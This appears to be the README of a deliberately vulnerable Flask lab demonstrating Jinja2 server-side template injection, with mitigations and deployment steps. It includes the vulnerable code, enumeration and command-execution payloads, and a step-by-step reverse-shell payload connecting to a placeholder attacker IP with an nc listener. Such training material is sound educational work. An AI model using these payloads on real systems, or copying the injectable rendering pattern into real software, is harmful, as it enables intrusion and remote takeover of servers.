# Vulnerable Flask Web Application - SSTI Demo

This is an intentionally vulnerable Flask web application that demonstrates a Server-Side Template Injection (SSTI) vulnerability.

## ⚠️ WARNING ⚠️

**This application is intentionally vulnerable and is designed for educational purposes only.**

Do not:
- Deploy this application in a production environment
- Use this code in real-world applications
- Run this on a publicly accessible server

## About Server-Side Template Injection (SSTI)

Server-Side Template Injection is a vulnerability that occurs when user input is directly embedded into a template and then rendered by the template engine. When template syntax is passed and evaluated by the server, an attacker can potentially:

1. Access sensitive data
2. Read local files
3. Execute arbitrary code
4. Gain full server access

## Vulnerability Description

This application demonstrates a classic SSTI vulnerability in Flask's Jinja2 template engine:

```python
# VULNERABLE CODE
@app.route('/render', methods=['POST'])
def render_template_vulnerable():
    user_template = request.form.get('template', '')
    rendered_template = render_template_string(user_template)  # VULNERABLE LINE
    return render_template('result.html', 
                           rendered_template=rendered_template,
                           template_source=user_template)
```

The vulnerability exists because user input is directly passed to `render_template_string()`, which evaluates it as a Jinja2 template.

## SSTI Attack Vectors

The application demonstrates several attack vectors:

1. **Basic Template Expressions**: `{{ 7*7 }}` - Performs math calculations
2. **Configuration Access**: `{{ config }}` - Displays Flask application configuration
3. **Object Introspection**: `{{ self.__class__.__mro__ }}` - Shows class inheritance hierarchy
4. **Class Enumeration**: `{{ self.__class__.__mro__[1].__subclasses__() }}` - Lists available Python classes

## Advanced Exploitation

For educational purposes, this application also describes more advanced exploitation techniques. In a real-world scenario, an attacker could achieve remote code execution by:

```
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('command', shell=True, stdout=-1).communicate()[0].strip() }}
```

Where `<index>` is the position of `subprocess.Popen` in the subclasses list. This could execute arbitrary system commands.

## Creating a Python Reverse Shell

⚠️ **WARNING: This section is for educational purposes only. Using this knowledge to access systems without authorization is illegal.** ⚠️

A more advanced exploitation technique is creating a reverse shell, which provides remote terminal access to the vulnerable server. Here's how to create a Python reverse shell using the SSTI vulnerability:

### Step 1: Set up a listener on your machine

First, set up a listener on your machine to receive the connection:

```bash
nc -lvnp 4444
```

### Step 2: Create and inject the reverse shell payload

Replace `<attacker-ip>` with your IP address and `<index>` with the subprocess.Popen index from the application:

```
{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &', shell=True) }}
```

This payload:
1. Creates a socket connection back to your machine
2. Redirects stdin, stdout, and stderr to the socket
3. Spawns an interactive shell

### Step 3: Execute the payload

Paste the payload into the "Enter Template Code" field on the vulnerable page and submit it. If successful, your listener will receive a connection, giving you shell access to the vulnerable container.

### Prevention

This advanced attack vector further emphasizes why template injection vulnerabilities are so dangerous. Always ensure that user input is never directly interpreted as a template.

## Running the Application

### Option 1: Run Directly with Python

1. Ensure you have Python and Flask installed:
   ```
   pip install -r requirements.txt
   ```

2. Navigate to the application directory:
   ```
   cd vulnerable-flask-app
   ```

3. Run the Flask application:
   ```
   python app.py
   ```

4. Open your browser and visit:
   ```
   http://127.0.0.1:5000
   ```

### Option 2: Run with Docker

1. Ensure you have Docker and Docker Compose installed

2. Navigate to the application directory:
   ```
   cd vulnerable-flask-app
   ```

3. Build and run the Docker container:
   ```
   docker compose up --build
   ```

4. Open your browser and visit:
   ```
   http://127.0.0.1:5000
   ```

To stop the Docker container, press Ctrl+C in the terminal or run:
```
docker compose down
```

### Option 3: Deploy to Kubernetes

This application can also be deployed to a Kubernetes cluster using the provided Kubernetes manifests.

#### Prerequisites
- Kubernetes cluster running (minikube, kind, or a cloud provider)
- kubectl configured to communicate with your cluster
- (Optional) Docker registry if you want to push the image

#### Steps to Deploy

1. Build and tag the Docker image:
   ```
   cd vulnerable-flask-app
   docker build -t vulnerable-flask-app:latest .
   ```

2. (Optional) Push to a container registry if deploying to a remote cluster:
   ```
   docker tag vulnerable-flask-app:latest <your-registry>/vulnerable-flask-app:latest
   docker push <your-registry>/vulnerable-flask-app:latest
   ```

3. If using a custom registry, update the image name in `kubernetes/kustomization.yaml`:
   ```yaml
   images:
   - name: vulnerable-flask-app
     newName: <your-registry>/vulnerable-flask-app
     newTag: latest
   ```

4. Apply the Kubernetes manifests:
   ```
   kubectl apply -k kubernetes/
   ```

5. Check the deployment status:
   ```
   kubectl get deployments,services,pods
   ```

6. Access the application:
   - If using minikube:
     ```
     minikube service vulnerable-flask-service
     ```
   - If using a cluster with ingress:
     Access via the ingress hostname or IP (configured in `kubernetes/service.yaml`)
   - For port-forwarding to local machine:
     ```
     kubectl port-forward svc/vulnerable-flask-service 8080:80
     ```
     Then access at http://localhost:8080

7. To remove the deployment:
   ```
   kubectl delete -k kubernetes/
   ```

#### Security Notes for Kubernetes

Remember that deploying this intentionally vulnerable application to a shared or production Kubernetes cluster is a security risk. Consider:
- Deploying to an isolated development or learning cluster
- Using namespace isolation
- Implementing network policies to restrict access
- Removing the deployment when you're done experimenting

## Secure Alternative

The application also demonstrates a secure approach to handling user input, where the input is passed as a variable to the template rather than being rendered as a template itself:

```python
# SECURE CODE
@app.route('/secure', methods=['POST'])
def render_template_secure():
    user_input = request.form.get('template', '')
    return render_template('result.html', 
                          rendered_template=user_input,
                          template_source=user_input,
                          secure=True)
```

## Mitigation Strategies

To prevent SSTI vulnerabilities:

1. Never pass user input directly to template rendering functions
2. Use template parameter passing instead of direct template rendering
3. Consider using a sandboxed template environment with restricted functionality
4. Implement proper input validation and sanitization
5. Apply the principle of least privilege to template contexts

## Resources for Learning More

- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [Flask Security Considerations](https://flask.palletsprojects.com/en/2.0.x/security/)
- [Jinja2 Template Designer Documentation](https://jinja.palletsprojects.com/en/3.0.x/templates/)
